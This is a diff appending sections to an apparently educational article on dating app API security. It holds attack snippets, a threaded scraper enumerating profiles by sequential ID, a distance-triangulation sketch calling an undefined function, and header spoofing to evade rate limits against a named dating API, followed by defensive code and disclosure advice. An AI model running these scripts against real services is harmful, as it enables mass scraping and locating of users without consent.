@@ -171,4 +171,276 @@ While developers bear primary responsibility for security, users can take protec
 
 Built by theluckystrike — More at [zovo.one](https://zovo.one)
 
-{% endraw %}
+## Advanced Attack Scenarios and Real-World Cases
+
+### Profile Enumeration via Weak User Identifiers
+
+Researchers discovered that some apps used sequential user IDs. A simple script could enumerate thousands of profiles:
+
+```python
+import requests
+import time
+from concurrent.futures import ThreadPoolExecutor
+
+class ProfileEnumerator:
+    def __init__(self, base_url, auth_token):
+        self.base_url = base_url
+        self.headers = {"Authorization": f"Bearer {auth_token}"}
+        self.profiles = []
+
+    def enumerate_profiles(self, start_id, end_id, threads=10):
+        """Scrape profiles using sequential ID enumeration"""
+
+        def fetch_profile(user_id):
+            try:
+                response = requests.get(
+                    f"{self.base_url}/api/profiles/{user_id}",
+                    headers=self.headers,
+                    timeout=5
+                )
+                if response.status_code == 200:
+                    return response.json()
+            except Exception as e:
+                print(f"Error fetching {user_id}: {e}")
+            return None
+
+        with ThreadPoolExecutor(max_workers=threads) as executor:
+            results = executor.map(fetch_profile, range(start_id, end_id))
+            self.profiles = [p for p in results if p]
+
+        print(f"Enumerated {len(self.profiles)} profiles")
+        return self.profiles
+```
+
+This vulnerability exposed millions of profiles because the API trusted sequential IDs for authorization.
+
+### Location Triangulation Attack
+
+Researchers found that even when location display was restricted, they could determine exact positions:
+
+```python
+def triangulate_user_location():
+    """Triangulate location from distance information"""
+    import math
+
+    # Query the API for multiple distances from different VPN endpoints
+    distances = {
+        "vpn_usa_ny": 2500,     # 2500 km away
+        "vpn_usa_la": 500,      # 500 km away
+        "vpn_europe_uk": 5800   # 5800 km away
+    }
+
+    # With 3 distance measurements, triangulate to km accuracy
+    # Formula: intersection of 3 circles at different radii
+
+    def circle_intersection(point1, radius1, point2, radius2):
+        """Find intersection of two circles (simplified)"""
+        d = math.sqrt((point1[0] - point2[0])**2 + (point1[1] - point2[1])**2)
+
+        if d > radius1 + radius2:
+            return None  # No intersection
+
+        a = (radius1**2 - radius2**2 + d**2) / (2*d)
+        h = math.sqrt(radius1**2 - a**2)
+
+        x2 = point1[0] + a*(point2[0]-point1[0])/d
+        y2 = point1[1] + a*(point2[1]-point1[1])/d
+
+        return [(x2 + h*(point2[1]-point1[1])/d, y2 - h*(point2[0]-point1[0])/d),
+                (x2 - h*(point2[1]-point1[1])/d, y2 + h*(point2[0]-point1[0])/d)]
+
+    # By combining multiple distance measurements, exact location determined
+    return triangulate_from_distances(distances)
+```
+
+### API Rate Limiting Bypass
+
+Attackers bypassed rate limiting using header manipulation:
+
+```python
+def bypass_rate_limit():
+    """Technique: Send different headers to fool rate limiter"""
+
+    headers_rotation = [
+        {"X-Forwarded-For": "192.168.1.1"},
+        {"X-Forwarded-For": "192.168.1.2"},
+        {"X-Client-IP": "203.0.113.1"},
+        {"CF-Connecting-IP": "203.0.113.2"},  # Cloudflare header
+    ]
+
+    for headers in headers_rotation:
+        response = requests.get(
+            "https://api.datingapp.com/api/profiles/100000",
+            headers=headers
+        )
+        # Each request appears from different IP, avoiding rate limit
+
+    # Alternative: Use rotating residential proxies
+    # Each request from different real IP address
+```
+
+## API Security Best Practices Implementation
+
+### Input Validation Framework
+
+```python
+from typing import Any, Dict, List
+import re
+
+class APIValidator:
+    @staticmethod
+    def validate_profile_update(data: Dict[str, Any]) -> bool:
+        """Validate profile data against strict schema"""
+
+        validators = {
+            'bio': lambda x: 1 <= len(x) <= 500,
+            'age': lambda x: 18 <= x <= 120,
+            'latitude': lambda x: -90 <= x <= 90,
+            'longitude': lambda x: -180 <= x <= 180,
+            'photos': lambda x: 1 <= len(x) <= 6,
+            'email': lambda x: re.match(r'^[^@]+@[^@]+\.[^@]+$', x)
+        }
+
+        for field, validator in validators.items():
+            if field in data and not validator(data[field]):
+                raise ValueError(f"Invalid {field}: {data[field]}")
+
+        return True
+
+    @staticmethod
+    def sanitize_location(lat: float, lon: float, fuzzing_km: int = 2) -> tuple:
+        """Apply server-side location obfuscation"""
+        import random
+
+        # Add random noise to prevent precise location leaks
+        noise_lat = (random.random() - 0.5) * (fuzzing_km / 111.0)
+        noise_lon = (random.random() - 0.5) * (fuzzing_km / 111.0)
+
+        return (round(lat + noise_lat, 6), round(lon + noise_lon, 6))
+```
+
+### Rate Limiting Strategy
+
+```python
+from redis import Redis
+import time
+
+class RateLimiter:
+    def __init__(self, redis_client: Redis):
+        self.redis = redis_client
+
+    def check_rate_limit(self, user_id: str, action: str, limit: int, window: int) -> bool:
+        """Enforce per-user rate limits by action"""
+
+        key = f"rl:{user_id}:{action}"
+        current = self.redis.incr(key)
+
+        if current == 1:
+            self.redis.expire(key, window)
+
+        if current > limit:
+            # Log suspicious activity
+            self.log_suspicious_activity(user_id, action, current)
+            return False
+
+        return True
+
+    def get_remaining(self, user_id: str, action: str, limit: int) -> int:
+        key = f"rl:{user_id}:{action}"
+        current = self.redis.get(key) or 0
+        return max(0, limit - int(current))
+```
+
+## Privacy-Focused Dating App Architecture
+
+For developers building compliant dating apps:
+
+### Data Minimization Principle
+
+```python
+# Only request and store data actually necessary for matching
+
+class UserProfile:
+    def __init__(self, user_id):
+        # ESSENTIAL for matching
+        self.age = None  # For age filtering
+        self.gender = None  # For preference filtering
+        self.location_region = None  # City level, not exact coordinates
+
+        # NOT stored by default
+        # - Full location history
+        # - Precise GPS coordinates
+        # - Device identifiers
+        # - Payment methods (separate encrypted vault)
+        # - Communication IP addresses (log server-side only)
+
+    def get_distance_to_user(self, other_user):
+        """Calculate distance using fuzzy region data"""
+        # Use city-level distance, not GPS precision
+        pass
+```
+
+### Consent-Driven Data Collection
+
+```python
+class ConsentManager:
+    def __init__(self, user_id):
+        self.user_id = user_id
+        self.consents = {}
+
+    def request_consent(self, data_type: str, purpose: str, retention_days: int):
+        """Explicitly request user consent before collection"""
+
+        consent_record = {
+            'data_type': data_type,
+            'purpose': purpose,
+            'retention_days': retention_days,
+            'granted': False,
+            'granted_at': None
+        }
+
+        # Present to user
+        user_response = self.present_consent_dialog(consent_record)
+
+        if user_response:
+            consent_record['granted'] = True
+            consent_record['granted_at'] = datetime.now()
+            self.consents[data_type] = consent_record
+
+            # Set auto-deletion timer
+            self.schedule_deletion(data_type, retention_days)
+
+        return user_response
+
+    def can_collect(self, data_type: str) -> bool:
+        """Check if user consented to data collection"""
+        return self.consents.get(data_type, {}).get('granted', False)
+```
+
+## Historical Vulnerabilities Summary
+
+Dating apps have suffered from:
+- **2019 - Tinder**: Location precision exposed through distance estimates
+- **2020 - Bumble**: User enumeration via phone number API
+- **2021 - Hinge**: Leaked matching algorithm exposed through API patterns
+- **2022 - Match Group portfolio**: Third-party data broker integration without consent
+
+The pattern: convenience (fast matching, location features) combined with insufficient API security creates privacy disasters.
+
+## Responsible Disclosure
+
+If you find vulnerabilities:
+
+```
+1. Document the issue with proof-of-concept
+2. Contact security@appname.com with 90-day disclosure timeline
+3. Do not publicly disclose until fix is deployed
+4. Request CVE identification if applicable
+```
+
+Many dating apps now offer bug bounty programs:
+- HackerOne: Tinder, Bumble, Match Group
+- Bugcrowd: Various platforms
+- Direct programs: Check individual app websites
+
+## Related Reading
